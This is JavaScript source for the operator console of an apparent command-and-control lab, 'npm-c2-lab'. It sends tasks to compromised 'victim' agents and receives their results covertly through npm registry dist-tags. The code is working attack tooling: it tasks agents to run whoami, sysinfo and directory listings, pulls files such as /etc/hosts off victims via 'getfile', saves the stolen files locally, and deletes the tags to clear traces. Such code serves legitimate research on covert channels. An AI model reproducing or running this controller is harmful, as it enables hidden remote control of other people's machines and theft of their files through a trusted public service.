// Attacker CLI: interactive REPL that issues commands and collects results
// exclusively through npm dist-tags. It never talks to a victim directly.
//
// While the prompt is idle, a background poller keeps running and prints
// live notifications: agents joining (announce tags) and tasks completing
// or failing (result tags).
//
// Commands:
//   agents                      list agents seen, with last-seen info
//   task <agentId|all> <op> [args...]   publish a command tag
//                         (ops: echo, sysinfo, ping, time, whoami,
//                          getfile, pwd, cd, ls, stat, hash)
//   history [n]                 show the last n requests/responses (default 20)
//   poll                        one-shot fetch & decode of new result tags
//   clean                       delete all lab tags (x-cmd-*/x-res-*/x-ann-*)
//   stats                       local counters: commands sent, results received
//   help                        show help
//   exit                        save state and quit

import readline from 'node:readline/promises';
import fs from 'node:fs';
import path from 'node:path';
import { styleText } from 'node:util';
import { loadConfig, configArgFromArgv } from '../common/config.js';
import { createLogger } from '../common/logger.js';
import {
  PINNED_VERSION,
  TASK_OPS,
  MAX_TAG_LEN,
  decodeAnnounceTag,
  decodeResultTag,
  encodeCommandTag,
  isAnnounceTag,
  isLabTag,
  isResultTag,
  reassembleResult,
} from '../common/protocol.js';
import { RegistryClient } from '../common/registry.js';
import { saveState } from '../victim/agent.js';

const tty = process.stdout.isTTY;
const c = (color, s) => (tty ? styleText(color, s) : s);

const HISTORY_MAX = 200; // persisted entries, capped so the state file stays small
const HISTORY_OUTPUT_MAX = 300; // chars of a result output kept in history
const PATH_ARG_OPS = new Set(['getfile', 'cd', 'stat', 'hash']); // path required
const OPS_WITH_ARGS = new Set([...PATH_ARG_OPS, 'ls', 'echo']); // ls path optional

function ts() {
  return new Date().toTimeString().slice(0, 8);
}

// ---------------------------------------------------------------------------
// attacker state (separate shape from victim state, same persistence helpers)
// ---------------------------------------------------------------------------

function defaultAttackerState() {
  return {
    nextSeq: {}, // per-target (agentId or 'all') next sequence number
    sent: 0,
    received: 0,
    perAgent: {}, // agentId -> results received
    seenResults: [], // "<agentId>:<seq>" strings
    agents: [], // agent ids observed
    agentInfo: {}, // agentId -> { ts, host, cwd, lastSeen }
    history: [], // [{ dir: 'out'|'in', ts, ... }]
  };
}

function loadAttackerState(path) {
  const s = defaultAttackerState();
  try {
    const raw = JSON.parse(fs.readFileSync(path, 'utf8'));
    if (raw && typeof raw === 'object') {
      for (const k of Object.keys(s)) {
        if (raw[k] !== undefined) s[k] = raw[k];
      }
    }
  } catch {
    // missing or corrupt state file -> start fresh
  }
  return s;
}

function pushHistory(state, entry) {
  state.history.push(entry);
  if (state.history.length > HISTORY_MAX) {
    state.history.splice(0, state.history.length - HISTORY_MAX);
  }
}

// ---------------------------------------------------------------------------

function parseTaskLine(line) {
  const tokens = line.trim().split(/\s+/);
  const [, target, op, ...rest] = tokens;
  if (!target || !op) {
    throw new Error('usage: task <agentId|all> <op> [args...]');
  }
  if (!TASK_OPS.includes(op)) {
    throw new Error(`unknown op "${op}" — allowed: ${TASK_OPS.join(', ')}`);
  }
  if (!OPS_WITH_ARGS.has(op) && rest.length > 0) {
    throw new Error(`op "${op}" takes no arguments`);
  }
  const args = {};
  if (op === 'echo') args.text = rest.join(' ');
  if (PATH_ARG_OPS.has(op) || op === 'ls') {
    const p = rest.join(' ');
    if (p) args.path = p;
    if (PATH_ARG_OPS.has(op) && !args.path) {
      throw new Error(
        `usage: task <agentId|all> ${op} <path>\n` +
          '  path is absolute (e.g. /etc/hosts) or relative to the agent\'s cwd ' +
          '(see the pwd/cd ops)',
      );
    }
  }
  return { target, op, args };
}

function sanitizeFilename(name) {
  return path.basename(String(name)).replace(/[^A-Za-z0-9._-]/g, '_') || 'file.bin';
}

/** Save a transferred file from a result payload to downloads/. */
function saveDownload(agentId, r) {
  const dir = path.resolve('downloads');
  fs.mkdirSync(dir, { recursive: true });
  const out = path.join(dir, `${agentId}-seq${r.seq}-${sanitizeFilename(r.file.name)}`);
  if (!Number.isSafeInteger(r.file.size) || r.file.size < 0) {
    throw new Error('missing or invalid file size');
  }
  if (typeof r.file.dataB64 !== 'string' || !/^[A-Za-z0-9+/]*={0,2}$/.test(r.file.dataB64)) {
    throw new Error('file payload is not valid base64');
  }
  const data = Buffer.from(r.file.dataB64, 'base64');
  if (data.length !== r.file.size) {
    throw new Error(`decoded size mismatch (${data.length} bytes, expected ${r.file.size})`);
  }
  fs.writeFileSync(out, data);
  return out;
}

function formatHistoryEntry(e) {
  const at = new Date(e.ts).toTimeString().slice(0, 8);
  if (e.dir === 'out') {
    const argStr = e.args && Object.keys(e.args).length > 0 ? ` ${JSON.stringify(e.args)}` : '';
    return `[${at}] ${c('blue', '->')} ${e.target} #${e.seq} ${e.op}${argStr}`;
  }
  const status = e.ok ? c('green', 'ok') : c('red', 'FAIL');
  const body = e.ok ? (e.output ?? '') : (e.error ?? '');
  return `[${at}] ${c('magenta', '<-')} ${e.agentId} #${e.seq} ${e.op} ${status}: ${body}`;
}

async function main() {
  const cfg = loadConfig(configArgFromArgv());
  const logger = createLogger({
    level: process.env.NPM_C2_LOG_LEVEL || 'info',
    logFile: cfg.logFile,
    console: false, // keep REPL output clean; log lines go to the file only
  });
  const statePath = cfg.stateFile || 'attacker-state.json';
  const state = loadAttackerState(statePath);
  const save = () => saveState(statePath, state);

  const client = new RegistryClient({
    registryUrl: cfg.registryUrl,
    packageName: cfg.packageName,
    token: cfg.token,
    logger,
  });

  console.log(c('cyan', 'npm-c2-lab attacker CLI (educational research only)'));
  console.log(`registry=${cfg.registryUrl} package=${cfg.packageName}`);
  if (!cfg.token) {
    console.log(c('yellow', 'warning: NPM_C2_TOKEN is not set — writes will fail with 401'));
  }
  console.log(`state=${statePath} (history: ${state.history.length} entries)`);
  console.log('type "help" for commands');

  // --- REPL (created before the poller so notifications can redraw the prompt)

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: c('blue', 'npm-c2> '),
  });

  /** Print a live notification without eating the line the user is typing. */
  function notify(line) {
    console.log(line);
    rl.prompt(true);
  }

  // --- shared helpers -------------------------------------------------------

  function noteAgent(agentId, info = {}) {
    const isNew = !state.agents.includes(agentId);
    if (isNew) state.agents.push(agentId);
    const prev = state.agentInfo[agentId] ?? {};
    state.agentInfo[agentId] = {
      ...prev,
      ...info,
      lastSeen: Date.now(),
    };
    if (isNew) {
      const { host, cwd } = state.agentInfo[agentId];
      const detail = [host && `host=${host}`, cwd && `cwd=${cwd}`].filter(Boolean).join(' ');
      notify(`[${ts()}] ${c('green', '[+] agent joined:')} ${c('bold', agentId)}${detail ? ` (${detail})` : ''}`);
    }
  }

  function printResult(agentId, r) {
    const head = `[${ts()}] ${c('magenta', agentId)} #${r.seq} ${r.op ?? '?'}`;
    if (!r.ok) {
      notify(`${head} ${c('red', 'FAILED')}: ${r.error}`);
      return;
    }
    if (r.file && typeof r.file.dataB64 === 'string') {
      try {
        const out = saveDownload(agentId, r);
        notify(`${head} ${c('green', 'done')}: ${r.output} -> saved to ${c('bold', out)}`);
      } catch (err) {
        notify(`${head} ${c('red', 'error')}: received file but failed to save: ${err.message}`);
      }
      return;
    }
    notify(`${head} ${c('green', 'done')}: ${r.output}`);
  }

  function recordResult(agentId, r) {
    pushHistory(state, {
      dir: 'in',
      ts: Date.now(),
      agentId,
      seq: r.seq,
      op: r.op ?? '?',
      ok: r.ok,
      output:
        typeof r.output === 'string' && r.output.length > HISTORY_OUTPUT_MAX
          ? `${r.output.slice(0, HISTORY_OUTPUT_MAX)}...`
          : r.output,
      error: r.error,
    });
  }

  let pollInFlight = false;

  async function pollOnce({ quiet = false } = {}) {
    if (pollInFlight) return 0; // background tick overlapping a manual poll
    pollInFlight = true;
    try {
      const tags = await client.getDistTags();
      const groups = new Map(); // "<agentId>:<seq>" -> parts[]
      for (const name of Object.keys(tags)) {
        if (isAnnounceTag(name)) {
          try {
            const ann = decodeAnnounceTag(name);
            noteAgent(ann.agentId, {
              ts: ann.payload.ts,
              host: ann.payload.host,
              cwd: ann.payload.cwd,
            });
          } catch (err) {
            logger.warn(`skipping malformed announce tag "${name}": ${err.message}`);
          }
          continue;
        }
        if (!isResultTag(name)) continue;
        let part;
        try {
          part = decodeResultTag(name);
        } catch (err) {
          logger.warn(`skipping malformed result tag "${name}": ${err.message}`);
          continue;
        }
        const key = `${part.agentId}:${part.seq}`;
        if (!groups.has(key)) groups.set(key, []);
        groups.get(key).push(part);
        noteAgent(part.agentId);
      }
      let fresh = 0;
      for (const [key, parts] of groups) {
        if (state.seenResults.includes(key)) continue;
        const total = parts[0].total;
        if (new Set(parts.map((p) => p.chunk)).size !== total) {
          if (!quiet) notify(c('yellow', `${key}: waiting for chunks (${new Set(parts.map((p) => p.chunk)).size}/${total})`));
          continue;
        }
        try {
          const result = reassembleResult(parts);
          const a = parts[0].agentId;
          printResult(a, result);
          recordResult(a, result);
          state.seenResults.push(key);
          state.received++;
          state.perAgent[a] = (state.perAgent[a] ?? 0) + 1;
          fresh++;
        } catch (err) {
          logger.warn(`failed to reassemble ${key}: ${err.message}`);
        }
      }
      save();
      if (!quiet) {
        notify(fresh === 0 ? 'no new results' : `${fresh} new result(s)`);
      }
      return fresh;
    } finally {
      pollInFlight = false;
    }
  }

  const commands = {
    help() {
      console.log(
        [
          `${c('bold', 'agents')}                          list agents seen (last-seen, host, cwd)`,
          `${c('bold', 'task')} <agentId|all> <op> [args]  send a task`,
          `  ops without args:            echo <text>, sysinfo, ping, time, whoami, pwd`,
          `  ops with a path:             getfile, cd, stat, hash  (absolute or cwd-relative)`,
          `  ls [path]                    list a directory (default: agent cwd)`,
          `${c('bold', 'history')} [n]                      last n requests/responses (default 20)`,
          `${c('bold', 'poll')}                            fetch & decode new result tags once`,
          `${c('bold', 'clean')}                           delete all x-cmd-*/x-res-*/x-ann-* tags`,
          `${c('bold', 'stats')}                           show local counters`,
          `${c('bold', 'help')}                            this help`,
          `${c('bold', 'exit')}                            save state and quit`,
          '',
          'live notifications (agent joined, task done/failed) print automatically',
        ].join('\n'),
      );
    },

    async agents() {
      try {
        await pollOnce({ quiet: true }); // best-effort refresh
      } catch (err) {
        console.log(c('yellow', `registry refresh failed: ${err.message}`));
      }
      if (state.agents.length === 0) {
        console.log('no agents seen yet');
      } else {
        for (const a of state.agents) {
          const info = state.agentInfo[a] ?? {};
          const seen = info.lastSeen ? new Date(info.lastSeen).toLocaleString() : '?';
          const detail = [info.host && `host=${info.host}`, info.cwd && `cwd=${info.cwd}`]
            .filter(Boolean)
            .join(' ');
          console.log(
            `- ${c('green', a)} (${state.perAgent[a] ?? 0} results, last seen ${seen})${detail ? `\n    ${detail}` : ''}`,
          );
        }
      }
    },

    async task(line) {
      const { target, op, args } = parseTaskLine(line);
      const seq = (state.nextSeq[target] ?? 0) + 1;
      const payload = { op, args, ts: Date.now() };
      const tag = encodeCommandTag(target, seq, payload); // throws if payload too big
      await client.setDistTag(tag, PINNED_VERSION);
      state.nextSeq[target] = seq;
      state.sent++;
      pushHistory(state, { dir: 'out', ts: Date.now(), target, seq, op, args });
      save();
      console.log(`[${ts()}] ${c('green', 'sent:')} task ${c('bold', `#${seq}`)} ${op} -> ${target} (tag ${tag.length}/${MAX_TAG_LEN} chars)`);
      console.log(c('dim', `  ${tag}`));
      if (state.agents.length > 0 && target !== 'all' && !state.agents.includes(target)) {
        console.log(c('yellow', `  note: agent "${target}" has not been seen yet`));
      }
    },

    async poll() {
      await pollOnce();
    },

    history(line) {
      const arg = line.trim().split(/\s+/)[1];
      const n = arg ? Number(arg) : 20;
      if (!Number.isSafeInteger(n) || n <= 0) {
        console.log('usage: history [n]');
        return;
      }
      const entries = state.history.slice(-n);
      if (entries.length === 0) {
        console.log('history is empty');
        return;
      }
      console.log(`last ${entries.length} of ${state.history.length} entries:`);
      for (const e of entries) console.log(formatHistoryEntry(e));
    },

    async clean() {
      const tags = await client.getDistTags();
      const lab = Object.keys(tags).filter(isLabTag);
      if (lab.length === 0) {
        console.log('nothing to clean');
        return;
      }
      let deleted = 0;
      for (const tag of lab) {
        try {
          await client.deleteDistTag(tag);
          deleted++;
        } catch (err) {
          console.log(c('yellow', `failed to delete ${tag}: ${err.message}`));
        }
      }
      const remaining = Object.keys(await client.getDistTags());
      console.log(`deleted ${deleted}/${lab.length} lab tags; remaining: ${remaining.join(', ') || '(none)'}`);
    },

    stats() {
      console.log(`commands sent:    ${state.sent}`);
      console.log(`results received: ${state.received}`);
      console.log(`agents seen:      ${state.agents.length}`);
      for (const [a, n] of Object.entries(state.perAgent)) {
        console.log(`  ${a}: ${n} results`);
      }
      console.log(`history entries:  ${state.history.length}`);
      console.log(`next seq:         ${JSON.stringify(state.nextSeq)}`);
    },
  };

  // --- background poller: live notifications while the prompt is idle -------

  const notifyIntervalSec = Math.min(cfg.pollIntervalSec, 5);
  let rlClosed = false;
  const timer = setInterval(async () => {
    if (rlClosed) return;
    try {
      await pollOnce({ quiet: true });
    } catch (err) {
      notify(c('yellow', `[${ts()}] background poll failed: ${err.message}`));
    }
  }, notifyIntervalSec * 1000);
  timer.unref?.();
  console.log(c('dim', `live notifications on (polling every ${notifyIntervalSec}s)`));

  // --- REPL loop ------------------------------------------------------------

  rl.prompt();

  async function handleLine(line) {
    const trimmed = line.trim();
    const cmd = trimmed.split(/\s+/)[0];
    try {
      if (trimmed === '') {
        // ignore
      } else if (cmd === 'exit' || cmd === 'quit') {
        save();
        rl.close();
        return;
      } else if (cmd === 'watch') {
        console.log('watch is gone — live notifications already poll in the background');
      } else if (commands[cmd]) {
        await commands[cmd](trimmed);
      } else {
        console.log(`unknown command "${cmd}" — type "help"`);
      }
    } catch (err) {
      console.log(c('red', `error: ${err.message}`));
      logger.error(`command "${cmd}" failed: ${err.message}`);
    }
    rl.prompt();
  }

  // Serialize command handling so piped input cannot race (e.g. "exit"
  // killing the process before an earlier async command finishes printing).
  let queue = Promise.resolve();
  rl.on('line', (line) => {
    queue = queue.then(() => handleLine(line));
  });

  rl.on('close', () => {
    queue.then(() => {
      rlClosed = true;
      clearInterval(timer);
      save();
      logger.close();
      console.log('bye');
      process.exit(0);
    });
  });
}

main().catch((err) => {
  console.error(`fatal: ${err.message}`);
  process.exit(1);
});
